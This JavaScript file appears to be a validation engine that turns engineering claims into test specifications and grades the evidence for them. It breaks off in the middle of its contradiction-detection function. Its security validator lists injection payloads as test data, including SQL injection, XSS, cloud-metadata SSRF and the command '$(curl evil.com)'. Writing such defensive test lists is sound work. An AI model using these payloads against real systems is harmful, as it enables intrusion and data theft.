#!/usr/bin/env node
/**
 * validation_engine.js — Tribunal Kit Phase 8: Autonomous Engineering Validation
 * ===============================================================================
 * Core Invariants:
 *   PASSING TESTS ≠ SYSTEM CORRECTNESS.
 *   NO IMPORTANT ENGINEERING CLAIM WITHOUT CORRESPONDING EVIDENCE.
 *   VALIDATION QUALITY IS ITSELF A TESTABLE PROPERTY.
 *
 * Pipeline:
 *   CLAIMS EXTRACTION → EVIDENCE GRAPH → TEST GENERATION → PROPERTY VALIDATION
 *   → ADVERSARIAL TESTING → CLAIM VERIFICATION → CONTRADICTION DETECTION
 *   → VALIDATION QUALITY AUDIT → REPORT → CERTIFICATE
 *
 * Implements Phase 8 Sections 4–54.
 */

'use strict';

const crypto = require('crypto');

// ============================================================================
// 1. CONSTANTS & ENUMS
// ============================================================================

const CLAIM_STATUS = {
  UNVERIFIED: 'UNVERIFIED',
  PARTIALLY_VERIFIED: 'PARTIALLY_VERIFIED',
  VERIFIED: 'VERIFIED',
  DISPROVED: 'DISPROVED',
  INCONCLUSIVE: 'INCONCLUSIVE',
  STALE: 'STALE',
  NOT_APPLICABLE: 'NOT_APPLICABLE',
};

const CLAIM_CATEGORIES = {
  FUNCTIONAL: 'functional',
  PERFORMANCE: 'performance',
  SECURITY: 'security',
  RELIABILITY: 'reliability',
  CONSISTENCY: 'consistency',
  SCALABILITY: 'scalability',
  IDEMPOTENCY: 'idempotency',
  CONCURRENCY: 'concurrency',
  DATA_INTEGRITY: 'data_integrity',
  AUTHORIZATION: 'authorization',
  API_CONTRACT: 'api_contract',
  DEPLOYMENT: 'deployment',
  COST: 'cost',
};

const EVIDENCE_QUALITY = {
  DIRECT: 'DIRECT',
  INDIRECT: 'INDIRECT',
  WEAK: 'WEAK',
  CONTRADICTORY: 'CONTRADICTORY',
  INSUFFICIENT: 'INSUFFICIENT',
};

const VALIDATION_LEVELS = {
  BASIC: 'basic',
  STANDARD: 'standard',
  DEEP: 'deep',
  ADVERSARIAL: 'adversarial',
  CHAOS: 'chaos',
};

const ROOT_CAUSE_TYPES = {
  OBSERVED: 'observed',
  IMMEDIATE: 'immediate',
  CONTRIBUTING: 'contributing',
  SYSTEMIC: 'systemic',
  ARCHITECTURAL: 'architectural',
};

const REPAIR_STATUS = {
  ATTEMPTED: 'attempted',
  SUCCEEDED: 'succeeded',
  FAILED: 'failed',
  ESCALATED: 'escalated',
};

// ============================================================================
// 2. CLAIM EXTRACTION ENGINE (SECTIONS 4–5)
// ============================================================================

/**
 * Claim extraction patterns for different engineering domains.
 */
const CLAIM_PATTERNS = [
  // Functional
  {
    match: /(?:endpoint|api|route)\s.*(?:returns?|responds?)/i,
    category: CLAIM_CATEGORIES.FUNCTIONAL,
    template: claim => `API endpoint behaves as specified: ${claim}`,
  },
  {
    match: /(?:creates?|updates?|deletes?|reads?)\s.*(?:record|entity|user|item)/i,
    category: CLAIM_CATEGORIES.FUNCTIONAL,
    template: claim => `CRUD operation: ${claim}`,
  },

  // Idempotency
  {
    match: /(?:idempoten)/i,
    category: CLAIM_CATEGORIES.IDEMPOTENCY,
    template: () => 'Operation is idempotent: repeated execution produces the same result',
  },

  // Concurrency
  {
    match: /(?:concurrent|race|parallel|thread.safe|atomic)/i,
    category: CLAIM_CATEGORIES.CONCURRENCY,
    template: () => 'Operation is safe under concurrent execution without race conditions',
  },

  // Security
  {
    match: /(?:auth|authenticated|authorized|permission)/i,
    category: CLAIM_CATEGORIES.SECURITY,
    template: () => 'All endpoints enforce authentication and authorization',
  },
  {
    match: /(?:sql.?inject|xss|csrf|ssrf|inject)/i,
    category: CLAIM_CATEGORIES.SECURITY,
    template: claim => `Protected against injection: ${claim}`,
  },
  {
    match: /(?:encrypt|tls|https|secure.?connect)/i,
    category: CLAIM_CATEGORIES.SECURITY,
    template: () => 'Data in transit is encrypted',
  },
  {
    match: /(?:multi.?tenant|tenant.?isolat)/i,
    category: CLAIM_CATEGORIES.SECURITY,
    template: () => 'Tenant data is isolated: cross-tenant access is impossible',
  },

  // Performance
  {
    match: /(?:latency|response.?time|p99|p95|fast|performan)/i,
    category: CLAIM_CATEGORIES.PERFORMANCE,
    template: claim => `Performance requirement met: ${claim}`,
  },
  {
    match: /(?:cache|cached|memoize)/i,
    category: CLAIM_CATEGORIES.PERFORMANCE,
    template: () => 'Caching layer functions correctly with proper invalidation',
  },

  // Reliability
  {
    match: /(?:retry|backoff|circuit.?break|timeout|resilient)/i,
    category: CLAIM_CATEGORIES.RELIABILITY,
    template: () =>
      'Retry and failure handling operates correctly with backoff and circuit breaking',
  },
  {
    match: /(?:dead.?letter|dlq|poison.?pill)/i,
    category: CLAIM_CATEGORIES.RELIABILITY,
    template: () => 'Failed messages are routed to dead-letter queue after bounded retries',
  },

  // Consistency
  {
    match: /(?:transact|acid|atomic|rollback)/i,
    category: CLAIM_CATEGORIES.CONSISTENCY,
    template: () => 'Database transactions maintain ACID properties',
  },
  {
    match: /(?:eventual|consistent|sync|replicate)/i,
    category: CLAIM_CATEGORIES.CONSISTENCY,
    template: () => 'Data consistency model is correctly implemented',
  },

  // Data Integrity
  {
    match: /(?:validat|schema|constraint|foreign.?key|unique)/i,
    category: CLAIM_CATEGORIES.DATA_INTEGRITY,
    template: () => 'Input validation and data constraints are enforced',
  },

  // API Contract
  {
    match: /(?:api.?contract|openapi|swagger|schema.?valid)/i,
    category: CLAIM_CATEGORIES.API_CONTRACT,
    template: () => 'API responses conform to documented contract/schema',
  },

  // Scalability
  {
    match: /(?:scal|horizontal|auto.?scale|load.?balance)/i,
    category: CLAIM_CATEGORIES.SCALABILITY,
    template: () => 'System scales under load as designed',
  },
];

/**
 * Extract engineering claims from task description, requirements, and architecture.
 *
 * @param {string} taskQuery
 * @param {Object} [requirements]
 * @param {Object} [architecture]
 * @returns {Array<Object>} Claims
 */
function extractClaims(taskQuery, requirements, architecture) {
  const q = (taskQuery || '').trim();
  const claims = [];
  const seen = new Set();

  // Extract from task description
  for (const pattern of CLAIM_PATTERNS) {
    if (pattern.match.test(q)) {
      const claimText = pattern.template(q);
      if (!seen.has(claimText)) {
        seen.add(claimText);
        claims.push({
          claim_id: `CLM-${crypto.randomUUID ? crypto.randomUUID().slice(0, 8) : Date.now().toString(36)}-${claims.length}`,
          claim: claimText,
          source: 'task_description',
          category: pattern.category,
          importance: categorizeImportance(pattern.category),
          verification_methods: getVerificationMethods(pattern.category),
          evidence_required: getRequiredEvidence(pattern.category),
          status: CLAIM_STATUS.UNVERIFIED,
        });
      }
    }
  }

  // Extract from requirements
  if (requirements && requirements.functional) {
    for (const fr of requirements.functional) {
      const claimText = `Functional requirement implemented: ${fr.requirement}`;
      if (!seen.has(claimText)) {
        seen.add(claimText);
        claims.push({
          claim_id: `CLM-${Date.now().toString(36)}-${claims.length}`,
          claim: claimText,
          source: 'requirement',
          category: CLAIM_CATEGORIES.FUNCTIONAL,
          importance: 'HIGH',
          verification_methods: ['unit_test', 'integration_test'],
          evidence_required: ['test_passes', 'code_review'],
          status: CLAIM_STATUS.UNVERIFIED,
        });
      }
    }
  }

  if (requirements && requirements.non_functional) {
    for (const nfr of requirements.non_functional) {
      const claimText = `Non-functional requirement met: ${nfr.requirement}`;
      if (!seen.has(claimText)) {
        seen.add(claimText);
        claims.push({
          claim_id: `CLM-${Date.now().toString(36)}-${claims.length}`,
          claim: claimText,
          source: 'requirement',
          category: mapNFRToCategory(nfr.category),
          importance: categorizeImportance(mapNFRToCategory(nfr.category)),
          verification_methods: getVerificationMethods(mapNFRToCategory(nfr.category)),
          evidence_required: getRequiredEvidence(mapNFRToCategory(nfr.category)),
          status: CLAIM_STATUS.UNVERIFIED,
        });
      }
    }
  }

  // Extract from architecture ADR
  if (architecture && architecture.adr) {
    const adr = architecture.adr;
    if (adr.decision && adr.decision.architecture) {
      const claimText = `Architecture decision valid: ${adr.decision.architecture} is appropriate for the requirements`;
      if (!seen.has(claimText)) {
        seen.add(claimText);
        claims.push({
          claim_id: `CLM-${Date.now().toString(36)}-${claims.length}`,
          claim: claimText,
          source: 'architecture_decision',
          category: CLAIM_CATEGORIES.FUNCTIONAL,
          importance: 'CRITICAL',
          verification_methods: ['architecture_conformance', 'fitness_test'],
          evidence_required: ['implementation_matches_adr', 'no_drift_detected'],
          status: CLAIM_STATUS.UNVERIFIED,
        });
      }
    }
  }

  return claims;
}

/**
 * Map NFR category to claim category.
 */
function mapNFRToCategory(nfrCategory) {
  const mapping = {
    performance: CLAIM_CATEGORIES.PERFORMANCE,
    reliability: CLAIM_CATEGORIES.RELIABILITY,
    security: CLAIM_CATEGORIES.SECURITY,
    scalability: CLAIM_CATEGORIES.SCALABILITY,
    consistency: CLAIM_CATEGORIES.CONSISTENCY,
    operations: CLAIM_CATEGORIES.DEPLOYMENT,
    quality: CLAIM_CATEGORIES.FUNCTIONAL,
    governance: CLAIM_CATEGORIES.SECURITY,
    cost: CLAIM_CATEGORIES.COST,
  };
  return mapping[nfrCategory] || CLAIM_CATEGORIES.FUNCTIONAL;
}

/**
 * Categorize claim importance based on its category.
 */
function categorizeImportance(category) {
  const critical = [
    CLAIM_CATEGORIES.SECURITY,
    CLAIM_CATEGORIES.DATA_INTEGRITY,
    CLAIM_CATEGORIES.AUTHORIZATION,
    CLAIM_CATEGORIES.CONSISTENCY,
  ];
  const high = [
    CLAIM_CATEGORIES.IDEMPOTENCY,
    CLAIM_CATEGORIES.CONCURRENCY,
    CLAIM_CATEGORIES.RELIABILITY,
    CLAIM_CATEGORIES.API_CONTRACT,
  ];
  if (critical.includes(category)) return 'CRITICAL';
  if (high.includes(category)) return 'HIGH';
  return 'MEDIUM';
}

/**
 * Get appropriate verification methods for a claim category.
 */
function getVerificationMethods(category) {
  const methods = {
    [CLAIM_CATEGORIES.FUNCTIONAL]: ['unit_test', 'integration_test'],
    [CLAIM_CATEGORIES.PERFORMANCE]: ['benchmark', 'load_test', 'latency_measurement'],
    [CLAIM_CATEGORIES.SECURITY]: ['security_scan', 'penetration_test', 'auth_matrix_test'],
    [CLAIM_CATEGORIES.RELIABILITY]: ['failure_injection', 'chaos_test', 'retry_test'],
    [CLAIM_CATEGORIES.CONSISTENCY]: ['transaction_test', 'concurrent_write_test'],
    [CLAIM_CATEGORIES.SCALABILITY]: ['load_test', 'capacity_test'],
    [CLAIM_CATEGORIES.IDEMPOTENCY]: ['duplicate_request_test', 'retry_test'],
    [CLAIM_CATEGORIES.CONCURRENCY]: ['concurrent_execution_test', 'race_condition_test'],
    [CLAIM_CATEGORIES.DATA_INTEGRITY]: ['constraint_test', 'validation_test', 'boundary_test'],
    [CLAIM_CATEGORIES.AUTHORIZATION]: [
      'rbac_test',
      'privilege_escalation_test',
      'cross_tenant_test',
    ],
    [CLAIM_CATEGORIES.API_CONTRACT]: ['schema_validation_test', 'response_format_test'],
    [CLAIM_CATEGORIES.DEPLOYMENT]: ['deployment_test', 'rollback_test', 'health_check_test'],
    [CLAIM_CATEGORIES.COST]: ['cost_analysis', 'resource_usage_test'],
  };
  return methods[category] || ['manual_review'];
}

/**
 * Get required evidence for a claim category.
 */
function getRequiredEvidence(category) {
  const evidence = {
    [CLAIM_CATEGORIES.FUNCTIONAL]: ['test_passes', 'code_review'],
    [CLAIM_CATEGORIES.PERFORMANCE]: ['benchmark_results', 'latency_p99'],
    [CLAIM_CATEGORIES.SECURITY]: ['security_scan_clean', 'auth_matrix_verified'],
    [CLAIM_CATEGORIES.RELIABILITY]: ['failure_recovery_verified', 'retry_behavior_verified'],
    [CLAIM_CATEGORIES.CONSISTENCY]: ['transaction_atomicity_verified', 'isolation_verified'],
    [CLAIM_CATEGORIES.SCALABILITY]: ['load_test_results', 'scaling_behavior_verified'],
    [CLAIM_CATEGORIES.IDEMPOTENCY]: ['duplicate_request_same_result', 'db_record_unchanged'],
    [CLAIM_CATEGORIES.CONCURRENCY]: ['no_race_conditions', 'no_lost_updates'],
    [CLAIM_CATEGORIES.DATA_INTEGRITY]: ['constraints_enforced', 'validation_rejects_invalid'],
    [CLAIM_CATEGORIES.AUTHORIZATION]: ['unauthorized_access_blocked', 'cross_tenant_blocked'],
    [CLAIM_CATEGORIES.API_CONTRACT]: ['response_matches_schema', 'status_codes_correct'],
    [CLAIM_CATEGORIES.DEPLOYMENT]: ['deployment_succeeds', 'rollback_verified'],
    [CLAIM_CATEGORIES.COST]: ['cost_within_budget'],
  };
  return evidence[category] || ['manual_verification'];
}

// ============================================================================
// 3. REQUIREMENT-TO-EVIDENCE GRAPH (SECTION 6)
// ============================================================================

/**
 * Build a traceability graph from requirements → claims → evidence.
 *
 * @param {Object} requirements
 * @param {Array} claims
 * @param {Array} [evidence]
 * @returns {Object} Evidence graph
 */
function buildEvidenceGraph(requirements, claims, evidence) {
  const nodes = [];
  const edges = [];

  // Requirement nodes
  const allReqs = [
    ...(requirements.functional || []),
    ...(requirements.non_functional || []),
    ...(requirements.constraints || []),
  ];

  for (const req of allReqs) {
    const reqId = `REQ-${nodes.length}`;
    nodes.push({ id: reqId, type: 'requirement', label: req.requirement, data: req });
  }

  // Claim nodes
  for (const claim of claims || []) {
    nodes.push({ id: claim.claim_id, type: 'claim', label: claim.claim, data: claim });

    // Connect claims to requirements by keyword matching
    for (let i = 0; i < allReqs.length; i++) {
      const reqLabel = (allReqs[i].requirement || '').toLowerCase();
      const claimLabel = (claim.claim || '').toLowerCase();
      if (claimLabel.includes(reqLabel) || reqLabel.includes(claim.category)) {
        edges.push({ from: `REQ-${i}`, to: claim.claim_id, type: 'validates' });
      }
    }
  }

  // Evidence nodes
  for (const ev of evidence || []) {
    const evId = `EV-${nodes.length}`;
    nodes.push({ id: evId, type: 'evidence', label: ev.description || ev.type, data: ev });

    // Connect evidence to claims
    if (ev.claim_id) {
      edges.push({ from: evId, to: ev.claim_id, type: 'supports' });
    }
  }

  return {
    nodes,
    edges,
    total_requirements: allReqs.length,
    total_claims: (claims || []).length,
    total_evidence: (evidence || []).length,
    coverage: allReqs.length > 0 ? (claims || []).length / allReqs.length : 0,
  };
}

// ============================================================================
// 4. TEST GENERATION ENGINE (SECTIONS 7–8)
// ============================================================================

/**
 * Generate test specifications for claims.
 *
 * @param {Array} claims
 * @param {Object} [architecture]
 * @returns {Array<Object>} Test specifications
 */
function generateTests(claims, architecture) {
  const tests = [];

  for (const claim of claims || []) {
    const claimTests = [];

    // Happy path
    claimTests.push({
      name: `happy_path_${claim.claim_id}`,
      type: 'happy_path',
      description: `Verify ${claim.claim} under normal conditions`,
      claim_id: claim.claim_id,
      priority: 'HIGH',
      automated: true,
    });

    // Boundary test
    claimTests.push({
      name: `boundary_${claim.claim_id}`,
      type: 'boundary',
      description: `Verify ${claim.claim} at boundary conditions`,
      claim_id: claim.claim_id,
      priority: 'MEDIUM',
      automated: true,
    });

    // Invalid input
    claimTests.push({
      name: `invalid_input_${claim.claim_id}`,
      type: 'invalid_input',
      description: `Verify ${claim.claim} rejects invalid input gracefully`,
      claim_id: claim.claim_id,
      priority: 'HIGH',
      automated: true,
    });

    // Category-specific tests
    if (claim.category === CLAIM_CATEGORIES.IDEMPOTENCY) {
      claimTests.push({
        name: `idempotency_duplicate_${claim.claim_id}`,
        type: 'idempotency',
        description: 'Send identical request 3 times; verify result is identical each time',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
        automated: true,
      });
    }

    if (claim.category === CLAIM_CATEGORIES.CONCURRENCY) {
      claimTests.push({
        name: `concurrent_execution_${claim.claim_id}`,
        type: 'concurrency',
        description:
          'Execute 10 concurrent requests for the same resource; verify no race conditions',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
        automated: true,
      });
    }

    if (claim.category === CLAIM_CATEGORIES.SECURITY) {
      claimTests.push({
        name: `auth_bypass_${claim.claim_id}`,
        type: 'security',
        description: 'Attempt access without authentication; verify 401/403 response',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
        automated: true,
      });
    }

    if (claim.category === CLAIM_CATEGORIES.RELIABILITY) {
      claimTests.push({
        name: `failure_recovery_${claim.claim_id}`,
        type: 'reliability',
        description: 'Simulate dependency failure; verify graceful degradation and recovery',
        claim_id: claim.claim_id,
        priority: 'HIGH',
        automated: true,
      });
    }

    tests.push(...claimTests);
  }

  return tests;
}

// ============================================================================
// 5. PROPERTY-BASED VALIDATION (SECTION 9)
// ============================================================================

/**
 * Generate property-based test specifications for claims.
 *
 * @param {Array} claims
 * @returns {Array<Object>} Property specifications
 */
function generateProperties(claims) {
  const properties = [];

  for (const claim of claims || []) {
    if (claim.category === CLAIM_CATEGORIES.IDEMPOTENCY) {
      properties.push({
        name: `property_idempotency_${claim.claim_id}`,
        property: 'f(x) === f(f(x)) for all valid inputs x',
        description:
          'For any valid input, executing the operation once produces the same observable state as executing it multiple times',
        claim_id: claim.claim_id,
        generators: ['valid_request_generator'],
        shrinkable: true,
      });
    }

    if (claim.category === CLAIM_CATEGORIES.AUTHORIZATION) {
      properties.push({
        name: `property_auth_isolation_${claim.claim_id}`,
        property:
          'For all users A, B where A.tenant ≠ B.tenant: accessible(A, resources(B)) === false',
        description: 'No user can access resources belonging to a different tenant',
        claim_id: claim.claim_id,
        generators: ['user_generator', 'tenant_generator'],
        shrinkable: true,
      });
    }

    if (claim.category === CLAIM_CATEGORIES.DATA_INTEGRITY) {
      properties.push({
        name: `property_validation_${claim.claim_id}`,
        property: 'For all invalid inputs x: process(x) throws ValidationError',
        description: 'All invalid inputs are rejected with appropriate error',
        claim_id: claim.claim_id,
        generators: ['invalid_input_generator'],
        shrinkable: true,
      });
    }

    if (claim.category === CLAIM_CATEGORIES.CONCURRENCY) {
      properties.push({
        name: `property_linearizable_${claim.claim_id}`,
        property:
          'For all concurrent operations: final state is equivalent to some serial execution',
        description: 'Concurrent operations produce a state consistent with some serial ordering',
        claim_id: claim.claim_id,
        generators: ['concurrent_operation_generator'],
        shrinkable: false,
      });
    }
  }

  return properties;
}

// ============================================================================
// 6. ADVERSARIAL TEST GENERATOR (SECTION 11)
// ============================================================================

/**
 * Generate adversarial test specifications.
 *
 * @param {Array} claims
 * @param {Object} [architecture]
 * @returns {Array<Object>} Adversarial tests
 */
function generateAdversarialTests(claims, architecture) {
  const tests = [];

  for (const claim of claims || []) {
    // Universal adversarial tests
    tests.push({
      name: `adversarial_empty_input_${claim.claim_id}`,
      type: 'adversarial',
      variant: 'empty_input',
      description: 'Send empty/null/undefined input',
      claim_id: claim.claim_id,
      priority: 'HIGH',
    });

    tests.push({
      name: `adversarial_oversized_${claim.claim_id}`,
      type: 'adversarial',
      variant: 'oversized_payload',
      description: 'Send payload exceeding expected size limits (10MB+)',
      claim_id: claim.claim_id,
      priority: 'HIGH',
    });

    tests.push({
      name: `adversarial_malformed_${claim.claim_id}`,
      type: 'adversarial',
      variant: 'malformed_input',
      description: 'Send malformed JSON, invalid UTF-8, or unexpected content types',
      claim_id: claim.claim_id,
      priority: 'HIGH',
    });

    // Category-specific adversarial tests
    if (claim.category === CLAIM_CATEGORIES.SECURITY) {
      tests.push({
        name: `adversarial_sqli_${claim.claim_id}`,
        type: 'adversarial',
        variant: 'sql_injection',
        description: 'Attempt SQL injection via all string inputs',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
      });
      tests.push({
        name: `adversarial_xss_${claim.claim_id}`,
        type: 'adversarial',
        variant: 'xss',
        description: 'Attempt XSS via reflected and stored input vectors',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
      });
      tests.push({
        name: `adversarial_priv_escalation_${claim.claim_id}`,
        type: 'adversarial',
        variant: 'privilege_escalation',
        description: 'Attempt to access admin resources with regular user credentials',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
      });
    }

    if (claim.category === CLAIM_CATEGORIES.IDEMPOTENCY) {
      tests.push({
        name: `adversarial_rapid_duplicate_${claim.claim_id}`,
        type: 'adversarial',
        variant: 'rapid_duplicate',
        description: 'Send 100 identical requests simultaneously',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
      });
    }

    if (claim.category === CLAIM_CATEGORIES.CONCURRENCY) {
      tests.push({
        name: `adversarial_race_condition_${claim.claim_id}`,
        type: 'adversarial',
        variant: 'race_condition',
        description: 'Interleave read-modify-write operations from 50 concurrent clients',
        claim_id: claim.claim_id,
        priority: 'CRITICAL',
      });
    }
  }

  return tests;
}

// ============================================================================
// 7. DOMAIN VALIDATORS (SECTIONS 12–20)
// ============================================================================

/**
 * Generate concurrency validation specifications.
 */
function validateConcurrency(operations) {
  return {
    type: 'concurrency',
    levels: [2, 10, 100, 1000],
    checks: [
      'No lost updates (final state reflects all writes)',
      'No duplicate writes (each operation produces exactly one DB record)',
      'No deadlocks (all operations complete within timeout)',
      'No non-atomic transitions (intermediate states not visible to other operations)',
      'No stale reads (read-after-write returns latest value)',
    ],
    operations: operations || [],
    automated: true,
  };
}

/**
 * Generate idempotency validation specifications.
 */
function validateIdempotency(operations) {
  return {
    type: 'idempotency',
    scenarios: [
      {
        name: 'single_retry',
        description: 'Request A sent once → state S1; Request A sent again → state S1 unchanged',
      },
      {
        name: 'triple_retry',
        description:
          'Request A sent 3 times → state S1; verify single DB record, single side effect',
      },
      {
        name: 'concurrent_duplicates',
        description: '10 identical requests simultaneously → single result, no duplicates',
      },
      {
        name: 'timeout_retry',
        description:
          'Request A times out → client retries with same idempotency key → single execution',
      },
    ],
    verifications: [
      'Final state identical after single and multiple executions',
      'Side effects (emails, webhooks, events) executed exactly once',
      'Database records not duplicated',
      'External API calls not duplicated',
    ],
    operations: operations || [],
    automated: true,
  };
}

/**
 * Generate retry validation specifications.
 */
function validateRetry(operations) {
  return {
    type: 'retry',
    failure_scenarios: [
      { scenario: 'timeout', description: 'Downstream service times out' },
      { scenario: 'http_500', description: 'Downstream returns HTTP 500' },
      { scenario: 'connection_reset', description: 'TCP connection reset mid-request' },
      { scenario: 'delayed_response', description: 'Response arrives after retry timeout' },
      { scenario: 'partial_failure', description: 'Response body truncated' },
    ],
    verifications: [
      'Retry count does not exceed maximum',
      'Backoff increases between retries (exponential + jitter)',
      'No duplicate side effects from retries',
      'Circuit breaker opens after threshold failures',
      'Circuit breaker half-opens after recovery period',
    ],
    operations: operations || [],
    automated: true,
  };
}

/**
 * Generate distributed system validation specifications.
 */
function validateDistributed(services) {
  return {
    type: 'distributed',
    scenarios: [
      { scenario: 'duplicate_message', description: 'Same message delivered twice to consumer' },
      { scenario: 'out_of_order', description: 'Messages arrive in different order than sent' },
      { scenario: 'delayed_message', description: 'Message arrives after significant delay' },
      { scenario: 'lost_connection', description: 'Network partition between services' },
      { scenario: 'leader_failure', description: 'Primary/leader service goes down' },
      { scenario: 'worker_failure', description: 'Worker crashes mid-processing' },
      { scenario: 'db_lag', description: 'Read replica is significantly behind primary' },
      { scenario: 'partial_outage', description: 'Some instances healthy, others not' },
    ],
    invariants: [
      'System recovers to consistent state after partition heals',
      'No data loss during recovery (unless explicitly acceptable)',
      'Duplicate messages do not produce duplicate side effects',
      'Out-of-order processing does not corrupt aggregate state',
    ],
    services: services || [],
    automated: true,
  };
}

/**
 * Generate database validation specifications.
 */
function validateDatabase(schemas, queries) {
  return {
    type: 'database',
    checks: [
      'Transactions maintain ACID properties under concurrent access',
      'Isolation level prevents dirty/phantom/non-repeatable reads as required',
      'Concurrent writes to same row resolve via conflict detection (not silent overwrite)',
      'Deadlocks are detected and resolved within bounded time',
      'Unique/foreign key constraints enforced at database level',
      'Rollback restores all modified rows to pre-transaction state',
      'Migrations run forward and backward without data loss',
      'Connection pool does not exhaust under load',
    ],
    schemas: schemas || [],
    queries: queries || [],
    automated: true,
  };
}

/**
 * Generate API contract validation specifications.
 */
function validateAPIContract(implementation, contract) {
  return {
    type: 'api_contract',
    checks: [
      'Request schema matches documented contract',
      'Response schema matches documented contract',
      'Status codes follow HTTP specification and API documentation',
      'Error responses include consistent error format',
      'Authentication required for protected endpoints',
      'Pagination follows documented pattern',
      'Rate limiting headers present when applicable',
      'Versioning strategy consistent across all endpoints',
      'Idempotency key handling follows documented behavior',
    ],
    implementation: implementation || {},
    contract: contract || {},
    automated: true,
  };
}

/**
 * Generate security validation specifications.
 */
function validateSecurity(implementation) {
  return {
    type: 'security',
    injection_tests: [
      {
        vector: 'SQL injection',
        inputs: ["'; DROP TABLE--", '1 OR 1=1', 'UNION SELECT * FROM users'],
      },
      {
        vector: 'XSS',
        inputs: ['<script>alert(1)</script>', '<img onerror=alert(1)>', '"><svg/onload=alert(1)>'],
      },
      {
        vector: 'SSRF',
        inputs: ['http://169.254.169.254/latest/meta-data/', 'http://localhost:6379/'],
      },
      {
        vector: 'Command injection',
        inputs: ['; cat /etc/passwd', '| whoami', '$(curl evil.com)'],
      },
      {
        vector: 'Path traversal',
        inputs: ['../../etc/passwd', '..\\..\\windows\\system32', '%2e%2e%2f'],
      },
      {
        vector: 'Prototype pollution',
        inputs: ['{"__proto__":{"isAdmin":true}}', '{"constructor":{"prototype":{"x":1}}}'],
      },
    ],
    auth_checks: [
      'Unauthenticated requests receive 401',
      'Unauthorized requests receive 403',
      'Expired tokens are rejected',
      'Forged/tampered tokens are rejected',
      'Token refresh rotation invalidates old refresh tokens',
      'Rate limiting on auth endpoints prevents brute force',
    ],
    tenant_isolation: [
      'User A cannot read User B data (different tenant)',
      'User A cannot write to User B resources (different tenant)',
      'User A cannot search/filter results from User B tenant',
      'User A cannot export data containing User B records',
      'Cache is tenant-scoped (no cross-tenant cache leakage)',
      'Queue/job payloads contain tenant context and are validated',
    ],
    implementation: implementation || {},
    automated: true,
  };
}

// ============================================================================
// 8. EVIDENCE QUALITY & STRENGTH (SECTIONS 28–29)
// ============================================================================

/**
 * Classify evidence quality.
 *
 * @param {Object} evidence
 * @returns {string} EVIDENCE_QUALITY value
 */
function classifyEvidenceQuality(evidence) {
  if (!evidence) return EVIDENCE_QUALITY.INSUFFICIENT;

  const type = (evidence.type || '').toLowerCase();

  // Direct evidence: test output, runtime measurement, security scan result
  if (/(?:test_output|runtime|benchmark|scan_result|actual_measurement)/i.test(type)) {
    return EVIDENCE_QUALITY.DIRECT;
  }

  // Indirect evidence: code review, static analysis, documentation
  if (/(?:code_review|static_analysis|documentation|manual_review)/i.test(type)) {
    return EVIDENCE_QUALITY.INDIRECT;
  }

  // Weak evidence: model inference, assumption
  if (/(?:inference|assumption|estimate|guess)/i.test(type)) {
    return EVIDENCE_QUALITY.WEAK;
  }

  return EVIDENCE_QUALITY.INSUFFICIENT;
}

// ============================================================================
// 9. CLAIM VERIFICATION ENGINE (SECTION 30)
// ============================================================================

/**
 * Verify a single claim against available evidence.
 *
 * @param {Object} claim
 * @param {Array} evidence
 * @returns {Object} Verification result
 */
function verifyClaim(claim, evidence) {
  if (!claim) return { status: CLAIM_STATUS.NOT_APPLICABLE, reason: 'No claim provided' };
  if (!evidence || evidence.length === 0) {
    return {
      claim_id: claim.claim_id,
      claim: claim.claim,
      status: CLAIM_STATUS.UNVERIFIED,
      reason: 'No evidence available',
      evidence_gap: claim.evidence_required || [],
      confidence: 0,
    };
  }

  const qualities = evidence.map(classifyEvidenceQuality);
  const hasContradiction = qualities.includes(EVIDENCE_QUALITY.CONTRADICTORY);
  const hasDirect = qualities.includes(EVIDENCE_QUALITY.DIRECT);
  const hasIndirect = qualities.includes(EVIDENCE_QUALITY.INDIRECT);

  if (hasContradiction) {
    return {
      claim_id: claim.claim_id,
      claim: claim.claim,
      status: CLAIM_STATUS.INCONCLUSIVE,
      reason: 'Contradictory evidence found — requires investigation',
      contradicting_evidence: evidence.filter(
        (_, i) => qualities[i] === EVIDENCE_QUALITY.CONTRADICTORY,
      ),
      confidence: 0.2,
    };
  }

  if (hasDirect) {
    // Check if all evidence supports the claim
    const allSupporting = evidence.every(e => e.supports !== false);
    return {
      claim_id: claim.claim_id,
      claim: claim.claim,
      status: allSupporting ? CLAIM_STATUS.VERIFIED : CLAIM_STATUS.DISPROVED,
      reason: allSupporting
        ? 'Direct evidence supports claim'
        : 'Direct evidence contradicts claim',
      evidence_count: evidence.length,
      confidence: allSupporting ? 0.95 : 0.05,
    };
  }

  if (hasIndirect) {
    return {
      claim_id: claim.claim_id,
      claim: claim.claim,
      status: CLAIM_STATUS.PARTIALLY_VERIFIED,
      reason: 'Indirect evidence supports claim, but direct verification recommended',
      evidence_count: evidence.length,
      confidence: 0.6,
    };
  }

  return {
    claim_id: claim.claim_id,
    claim: claim.claim,
    status: CLAIM_STATUS.UNVERIFIED,
    reason: 'Evidence is insufficient quality for verification',
    evidence_count: evidence.length,
    confidence: 0.2,
  };
}

// ============================================================================
// 10. CONTRADICTION ENGINE (SECTION 31)
// ============================================================================

/**
 * Detect contradictions within an evidence set.
 *
 * @param {Array} evidenceSet
 * @returns {Array<Object>} Contradictions
 */
function detectContradictions(evidenceSet) {
  const contradictions = [];
  if (!evidenceSet || evidenceSet.length < 2) return contradictions;

  // Group evidence by claim
  const byClaim = {};
  for (const ev of evidenceSet) {
    const cid = ev.claim_id || 'general';
    if (!byClaim[cid]) byClaim[cid] = [];
    byClaim[cid].push(ev);
  }

  for (const [claimId, evidences] of Object.entries(byClaim)) {
    const supporting = evidences.filter(e => e.supports !== false);
    const contradicting = evidences.filter(e => e.supports === false);

    if (supporting.length > 0 && contradicting.length > 0) {
      contradictions.push({
        claim_id: claimId,
        type: 'CONFLICTING_EVIDENCE',
        supporting_count: supporting.length,
        contradicting_count: contradicting.length,
        severity: 'HIGH',
        resolution: 'Investigate root cause. Do not average conflicting evidence.',
        supporting_evidence: supporting,
        contradicting_evidence: contradicting,
      });
    }
  }

  // Cross-claim contradiction: e.g., "all tests pass" but "load test fails"
  const passAll = evidenceSet.some(e => /all.*pass/i.test(e.description || ''));
  const someFail = evidenceSet.some(e => /fail/i.test(e.description || '') && e.supports === false);
